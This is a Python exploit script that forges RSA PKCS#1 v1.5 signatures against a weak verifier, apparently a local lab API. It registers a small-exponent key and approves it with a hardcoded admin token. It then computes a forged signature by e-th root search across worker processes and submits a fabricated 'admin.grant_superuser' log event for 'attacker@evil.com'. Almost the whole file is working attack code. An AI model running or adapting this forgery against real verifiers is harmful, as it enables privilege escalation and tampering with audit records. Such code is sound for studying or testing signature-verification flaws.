#!/usr/bin/env python3
"""
OPTIMIZED RSA FORGE - Multiprocess Version

Fast signature forgery for weak PKCS#1 v1.5 verifier.
Uses multiprocessing to maximize CPU utilization.
"""

import base64
import hashlib
import json
import os
import sys
import time
import secrets
import requests
import multiprocessing as mp
from typing import Optional, Tuple
from datetime import datetime, timezone
from math import gcd

# ============================================================================
# CONFIGURATION
# ============================================================================

API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"
NUM_WORKERS = max(1, mp.cpu_count())

# Shared state for workers
found_signature = mp.Value('i', 0)  # 0 = not found, 1 = found
result_queue = mp.Queue()

# ============================================================================
# UTILITIES
# ============================================================================

def integer_nth_root(x: int, n: int) -> int:
    """Fast integer n-th root using Newton's method."""
    if x == 0:
        return 0
    guess = 1 << ((x.bit_length() + n - 1) // n)
    while True:
        new_guess = ((n - 1) * guess + x // (guess ** (n - 1))) // n
        if new_guess >= guess:
            return guess
        guess = new_guess


def is_prime(n: int, k: int = 20) -> bool:
    """Miller-Rabin primality test."""
    if n < 2: return False
    if n == 2 or n == 3: return True
    if n % 2 == 0: return False
    
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    for _ in range(k):
        a = secrets.randbelow(n - 3) + 2
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def generate_prime(bits: int) -> int:
    """Generate random prime."""
    while True:
        n = secrets.randbits(bits)
        n |= (1 << (bits - 1)) | 1
        if is_prime(n):
            return n


def modinv(a: int, m: int) -> int:
    """Modular inverse using extended Euclidean algorithm."""
    def extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        g, x1, y1 = extended_gcd(b % a, a)
        return g, y1 - (b // a) * x1, x1
    
    g, x, _ = extended_gcd(a % m, m)
    if g != 1:
        raise ValueError("No modular inverse")
    return (x % m + m) % m


# ============================================================================
# WORKER FUNCTIONS
# ============================================================================

def worker_math_attack(
    worker_id: int,
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    found_flag,
    result_q,
    attempts_per_worker: int
):
    """Worker for mathematical e-th root attack."""
    hash_len = len(target_hash)
    delta_range = 50 if e <= 3 else (200 if e <= 7 else 500)
    
    # Different workers try different structures
    ff_lengths = [1, 2, 4, 8, 16, 32]
    my_ff = ff_lengths[worker_id % len(ff_lengths)]
    
    for attempt in range(attempts_per_worker):
        if found_flag.value:
            return
        
        # Try hash at end (garbage absorbs error)
        prefix = b'\x00\x01' + (b'\xff' * my_ff) + b'\x00'
        garbage_len = key_size - len(prefix) - hash_len
        
        if garbage_len < 0:
            continue
        
        garbage = secrets.token_bytes(garbage_len)
        em = prefix + garbage + target_hash
        em_int = int.from_bytes(em, byteorder='big')
        
        sig_base = integer_nth_root(em_int, e)
        
        for delta in range(-delta_range, delta_range + 1):
            if found_flag.value:
                return
            
            sig = sig_base + delta
            if sig <= 0 or sig >= n:
                continue
            
            # Check signature
            check = pow(sig, e, n)
            check_bytes = check.to_bytes(key_size, byteorder='big')
            
            # Weak verifier checks
            if check_bytes[0:2] != b'\x00\x01':
                continue
            
            # Find separator
            sep_idx = -1
            for i in range(2, min(20, key_size)):
                if check_bytes[i] == 0x00:
                    sep_idx = i
                    break
            
            if sep_idx == -1:
                continue
            
            # Check hash
            if target_hash in check_bytes[sep_idx + 1:]:
                found_flag.value = 1
                result_q.put(sig)
                return


def worker_random_search(
    worker_id: int,
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    found_flag,
    result_q,
    attempts_per_worker: int
):
    """Worker for random signature search."""
    batch = 1000
    
    for _ in range(attempts_per_worker // batch):
        if found_flag.value:
            return
        
        for _ in range(batch):
            sig = secrets.randbelow(n)
            
            check = pow(sig, e, n)
            check_bytes = check.to_bytes(key_size, byteorder='big')
            
            if check_bytes[0:2] != b'\x00\x01':
                continue
            
            sep_idx = -1
            for i in range(2, min(20, key_size)):
                if check_bytes[i] == 0x00:
                    sep_idx = i
                    break
            
            if sep_idx == -1:
                continue
            
            if target_hash in check_bytes[sep_idx + 1:]:
                found_flag.value = 1
                result_q.put(sig)
                return


# ============================================================================
# MAIN ATTACK
# ============================================================================

def forge_multiprocess(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    max_attempts: int = 100_000_000
) -> Optional[int]:
    """
    Multi-process signature forgery.
    """
    print(f"\n  [Multiprocess Forge: {NUM_WORKERS} workers]")
    print(f"  e = {e}, key_size = {key_size}")
    
    # Reset shared state
    found_signature.value = 0
    while not result_queue.empty():
        result_queue.get_nowait()
    
    attempts_per_worker = max_attempts // NUM_WORKERS
    
    # Choose attack method based on e
    if e <= 17:
        print(f"  Strategy: Mathematical e-th root attack")
        worker_fn = worker_math_attack
    else:
        print(f"  Strategy: Random search")
        worker_fn = worker_random_search
    
    start_time = time.time()
    
    # Start workers
    processes = []
    for i in range(NUM_WORKERS):
        p = mp.Process(
            target=worker_fn,
            args=(i, n, e, key_size, target_hash, found_signature, result_queue, attempts_per_worker)
        )
        p.start()
        processes.append(p)
    
    print(f"  Started {len(processes)} workers...")
    
    # Monitor progress
    result = None
    while any(p.is_alive() for p in processes):
        if not result_queue.empty():
            result = result_queue.get()
            found_signature.value = 1
            break
        time.sleep(0.5)
    
    # Wait for workers to finish
    for p in processes:
        p.join(timeout=1)
        if p.is_alive():
            p.terminate()
    
    elapsed = time.time() - start_time
    
    if result:
        print(f"\n  ✓ FOUND in {elapsed:.1f}s!")
        return result
    else:
        print(f"\n  ✗ Not found after {elapsed:.1f}s")
        return None


def forge_single_thread(
    n: int,
    e: int,
    key_size: int,
    target_hash: bytes,
    max_attempts: int = 10_000_000
) -> Optional[int]:
    """Single-threaded forge for comparison."""
    print(f"\n  [Single-thread Forge]")
    
    hash_len = len(target_hash)
    delta_range = 50 if e <= 3 else (200 if e <= 7 else 500)
    
    start = time.time()
    
    for attempt in range(max_attempts):
        # Try different FF lengths
        ff_len = 1 + (attempt % 16)
        prefix = b'\x00\x01' + (b'\xff' * ff_len) + b'\x00'
        garbage_len = key_size - len(prefix) - hash_len
        
        if garbage_len < 0:
            continue
        
        garbage = secrets.token_bytes(garbage_len)
        em = prefix + garbage + target_hash
        em_int = int.from_bytes(em, byteorder='big')
        
        sig_base = integer_nth_root(em_int, e)
        
        for delta in range(-delta_range, delta_range + 1):
            sig = sig_base + delta
            if sig <= 0 or sig >= n:
                continue
            
            check = pow(sig, e, n)
            check_bytes = check.to_bytes(key_size, byteorder='big')
            
            if check_bytes[0:2] != b'\x00\x01':
                continue
            
            sep_idx = -1
            for i in range(2, min(20, key_size)):
                if check_bytes[i] == 0x00:
                    sep_idx = i
                    break
            
            if sep_idx == -1:
                continue
            
            if target_hash in check_bytes[sep_idx + 1:]:
                elapsed = time.time() - start
                print(f"  ✓ Found at attempt={attempt}, delta={delta}, {elapsed:.1f}s")
                return sig
        
        if (attempt + 1) % 10000 == 0:
            elapsed = time.time() - start
            rate = (attempt + 1) / elapsed
            print(f"    {(attempt+1)//1000}K attempts, {rate:.0f}/s")
    
    return None


# ============================================================================
# KEY SETUP
# ============================================================================

def setup_key(e: int) -> Tuple[str, str, int, int, int]:
    """Setup RSA key via API."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    
    ts = int(time.time())
    service_id = f"mp-attack-e{e}-{ts}"
    
    print(f"  Creating key with e={e}...")
    
    if e in (3, 65537):
        priv = rsa.generate_private_key(public_exponent=e, key_size=2048, backend=default_backend())
        pub = priv.public_key()
        nums = pub.public_numbers()
        n_val, e_val = nums.n, nums.e
        pem = pub.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
    else:
        # Custom RSA generation
        print(f"    Generating custom RSA with e={e}...")
        while True:
            p = generate_prime(1024)
            q = generate_prime(1024)
            if p == q:
                continue
            n_val = p * q
            phi = (p - 1) * (q - 1)
            if gcd(e, phi) != 1:
                continue
            try:
                modinv(e, phi)
                break
            except:
                continue
        
        e_val = e
        nums = RSAPublicNumbers(e_val, n_val)
        pub = nums.public_key(default_backend())
        pem = pub.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
    
    # Register
    resp = requests.post(
        f"{API_BASE}/v1/keys/register",
        json={
            "service_id": service_id,
            "public_key_pem": pem,
            "algorithm": "rsa-pkcs1v15-vulnerable"
        },
        timeout=10
    )
    
    if resp.status_code not in (200, 201):
        raise Exception(f"Register failed: {resp.text}")
    
    key_id = resp.json().get("public_key_id")
    print(f"  ✓ Registered: {key_id}")
    
    # Approve
    approve = requests.post(
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={"public_key_id": key_id, "action": "approve"},
        timeout=10
    )
    
    if approve.status_code not in (200, 201):
        raise Exception(f"Approve failed: {approve.text}")
    
    print(f"  ✓ Approved")
    
    key_size = (n_val.bit_length() + 7) // 8
    return service_id, key_id, n_val, e_val, key_size


# ============================================================================
# MAIN
# ============================================================================

def main():
    print("="*60)
    print("  MULTIPROCESS RSA SIGNATURE FORGE")
    print("="*60)
    
    e = 3
    if len(sys.argv) > 1:
        try:
            e = int(sys.argv[1])
        except:
            pass
    
    print(f"\n  Target e = {e}")
    print(f"  CPU cores = {NUM_WORKERS}")
    
    # Setup
    print(f"\n{'━'*50}")
    print("  SETUP KEY")
    print(f"{'━'*50}")
    
    try:
        service_id, key_id, n, actual_e, key_size = setup_key(e)
    except Exception as ex:
        print(f"  ✗ Setup failed: {ex}")
        return
    
    print(f"  n: {n.bit_length()} bits, e: {actual_e}, key: {key_size} bytes")
    
    # Create event
    print(f"\n{'━'*50}")
    print("  CREATE EVENT")
    print(f"{'━'*50}")
    
    event = {
        "action": "admin.grant_superuser",
        "actor": "admin@corp.com",
        "target": "attacker@evil.com",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "note": f"FORGED e={actual_e}"
    }
    
    message = json.dumps(event, sort_keys=True, separators=(',', ':')).encode()
    msg_hash = hashlib.sha256(message).digest()
    
    print(f"  Hash: {msg_hash.hex()[:16]}...")
    
    # Forge
    print(f"\n{'━'*50}")
    print("  FORGE SIGNATURE")
    print(f"{'━'*50}")
    
    if actual_e <= 17:
        # Use multiprocess for small e
        sig_int = forge_multiprocess(n, actual_e, key_size, msg_hash, max_attempts=50_000_000)
    else:
        # For large e, try but will likely fail
        sig_int = forge_multiprocess(n, actual_e, key_size, msg_hash, max_attempts=100_000_000)
    
    if not sig_int:
        print("\n  ✗ Forge failed")
        print("  Try e=3 for guaranteed success: python script.py 3")
        return
    
    sig_bytes = sig_int.to_bytes(key_size, byteorder='big')
    print(f"\n  ✓ Signature: {sig_bytes.hex()[:40]}...")
    
    # Send
    print(f"\n{'━'*50}")
    print("  SEND TO API")
    print(f"{'━'*50}")
    
    sig_b64 = base64.b64encode(sig_bytes).decode()
    event_str = json.dumps(event, sort_keys=True, separators=(',', ':'))
    
    resp = requests.post(
        f"{API_BASE}/v1/logs",
        json={
            "service_id": service_id,
            "event_type": "FORGED",
            "event": event_str,
            "event_data": event,
            "signature": sig_b64,
            "public_key_id": key_id
        },
        timeout=10
    )
    
    print(f"  Status: {resp.status_code}")
    print(f"  Body: {resp.json()}")
    
    if resp.status_code == 200 and resp.json().get("status") == "accepted":
        print("\n  " + "!"*40)
        print("  ⚠️  ATTACK SUCCESSFUL!")
        print("  " + "!"*40)


if __name__ == "__main__":
    mp.freeze_support()  # For Windows
    main()
